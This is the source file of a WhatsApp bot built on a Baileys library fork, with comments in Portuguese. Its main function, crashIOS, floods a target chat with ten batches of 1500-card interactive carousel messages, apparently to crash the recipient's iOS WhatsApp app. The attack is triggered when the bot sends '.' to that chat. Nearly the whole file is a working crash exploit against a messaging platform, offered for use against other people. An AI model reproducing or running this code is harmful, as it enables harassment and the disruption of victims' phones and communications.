// main.js
const {
  generateWAMessageFromContent,
  downloadContentFromMessage,
  makeCacheableSignalKeyStore,
  prepareWAMessageMedia,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
  PHONENUMBER_MCC,
  useMultiFileAuthState,
  generateMessageID,
  getTypeMessage,
  makeWASocket,
  delay,
  proto,
  store,
  chats
} = require("@angstvorfrauen/baileys");
const { Boom } = require("@hapi/boom");
const libPhonenumber = require("libphonenumber-js");
const moment = require("moment-timezone");
const NodeCache = require("node-cache");
const gradient = require("gradient-string");
const path = require("path");
const pino = require("pino");
const Jimp = require("jimp");
const os = require("os");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256 } = require("./database/mediaall.js");
const { menu } = require("./database/menu.js");
// Função exportada para iniciar o crash: envia um "." para o alvo, o que aciona o case "" ao enviar (fromMe=true)
async function initiateCrash(sock, targetJid) {
  await sock.sendMessage(targetJid, { text: "." });
}
// Função exportada para crash iOS (agora acionada apenas via envio do bot)
async function crashIOS(sock, targetJid) {
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      "header": {
        "title": ".",
        "imageMessage": {
          "url": `${url}`,
          "mimetype": "image/jpeg",
          "caption": ".",
          "fileSha256": `${fileSha256}`,
          "fileLength": "10",
          "height": 1000,
          "width": 1000,
          "mediaKey": `${mediaKey}`,
          "fileEncSha256": `${fileEncSha256}`,
          "directPath": `${directPath}`,
          "jpegThumbnail": `${jpegThumbnail}`,
        },
        "hasMediaAttachment": true
      },
      "body": { "text": "." },
      "footer": { "text": "." },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
              "display_text": "x",
              "url": "https://google.com",
              "merchant_url": "https://google.com"
            })
          }
        ]
      }
    };
    console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
    const card = Array(1500).fill(singleCard);
    await sock.sendjson(targetJid, {
      "interactiveMessage": {
        "body": { "text": "." },
        "carouselMessage": {
          "cards": card
        }
      }
    });
  }
  console.log("✅ Envio de cartas concluído.");
}
module.exports = async (sock, m, chatUpdate) => {
  const message = m
  m.id = m.key.id;
  m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
  m.chat = m.key.remoteJid;
  m.fromMe = m.key.fromMe;
  m.isGroup = m.chat.endsWith("@g.us");
  m.sender = sock.decodeJid(m.fromMe && sock.user.id || m.participant || m.key.participant || m.chat || "");
  if (m.isGroup) m.participant = sock.decodeJid(m.key.participant) || "";
  function getTypeM(message) {
    const type = Object.keys(message);
    var restype = (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) || type[type.length - 1] || Object.keys(message)[0];
    return restype;
  };
  m.mtype = getTypeM(m.message);
  m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
  m.text = m.msg?.text
      || m.msg?.caption
      || m.message?.conversation
      || m.msg?.contentText
      || m.msg?.selectedDisplayText
      || m.msg?.title
      || "";
  const info = m;
  const from = message.key.remoteJid;
  var body =
    (m.mtype === "interactiveResponseMessage") ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:
    (m.mtype === "conversation") ? m.message.conversation :
    (m.mtype === "deviceSentMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "imageMessage") ? m.message.imageMessage.caption :
    (m.mtype == "videoMessage") ? m.message.videoMessage.caption :
    (m.mtype == "extendedTextMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "buttonsResponseMessage") ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.mtype == "templateButtonReplyMessage") ? m.message.templateButtonReplyMessage.selectedId :
    (m.mtype == "messageContextInfo") ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : "";
  const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
      i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : "";
    };
    return admins || [];
  }
  const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
  var budy = (typeof m.text == "string" ? m.text: "");
  const bardy = body || "";
  prefix = [".","!",""]
  var prefix = prefix
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(bardy)
    ? bardy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefix ?? global.prefix;
  const isCmd = bardy.startsWith(prefix);
  const command = isCmd ? bardy.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
  const quoted = m.quoted ? m.quoted : m;
  const sender = info.key.fromMe ? (sock.user.id.split(":")[0]+"@s.whatsapp.net" || sock.user.id) : (info.key.participant || info.key.remoteJid)
  const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : "";
  const participants = m.isGroup ? await groupMetadata.participants : "";
  const botNumber = await sock.decodeJid(sock.user.id);
  const device = "" + (info.key.id.length > 21 ? "Android" : info.key.id.substring(0, 2) == "3A" ? "Ios": "Web ore Api ore Bot");
  const date = moment.tz("Europe/Berlin").format("DD/MM/YY");
  const time = moment.tz("Europe/Berlin").format("HH:mm:ss");
  const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
  const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
  const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
  const groupName = m.isGroup ? groupMetadata?.subject : "";
  const mime = (quoted.msg || quoted).mimetype || "";
  const args = bardy.trim().split(/ +/).slice(1);
  const isBot = info.key.fromMe ? true : false;
  const IsOwner = (m.sender === "5582993708218@s.whatsapp.net");
  const username = m.pushName || "No Name";
  const content = JSON.stringify(m.message);
  const isGroup = from.endsWith("@g.us");
  const sJid = "status@broadcast";
  const text = args.join(" ");
  const q = args.join(" ");
  const reply = (text) => {
    sock.sendMessage(from, {
     text: text,
    })
  }
  sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
    const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
    return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id});
  };
  const isImage = m.mtype === "imageMessage";
  const isVideo = m.mtype === "videoMessage";
  const isAudio = m.mtype === "audioMessage";
  const isSticker = m.mtype === "stickerMessage";
  const isContact = m.mtype === "contactMessage";
  const isPoll = m.mtype === "pollMessage";
  const isLocation = m.mtype === "locationMessage";
  const isProduct = m.mtype === "productMessage";
  if (isImage) {
    m.mtypeMessage = "Image";
  } else if (isVideo) {
    m.mtypeMessage = "Video";
  } else if (isAudio) {
    m.mtypeMessage = "Audio";
  } else if (isSticker) {
    m.mtypeMessage = "Sticker";
  } else if (isContact) {
    m.mtypeMessage = "Contact";
  } else if (isPoll) {
    m.mtypeMessage = "Poll";
  } else if (isLocation) {
    m.mtypeMessage = "Location";
  } else if (isProduct) {
    m.mtypeMessage = "Product";
  }
  const isQuotedMsg = m.mtype === "extendedTextMessage" && content.includes("textMessage");
  const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage");
  const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage");
  const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage");
  const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage");
  const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage");
  const isQuotedPoll = m.mtype === "extendedTextMessage" && content.includes("pollMessage");
  const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactMessage");
  const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage");
  const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage");
  switch(command) {
    case "": { // use the command with: . but, this dont cause conflict with other commands
      if (!isBot) return; // Alterado: agora aciona apenas quando o bot ENVIA o ".", não quando recebe
      await crashIOS(sock, from);
    }
    break;
  }
}
module.exports.crashIOS = crashIOS;
module.exports.initiateCrash = initiateCrash;
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  delete require.cache[file];
  require(file);
});
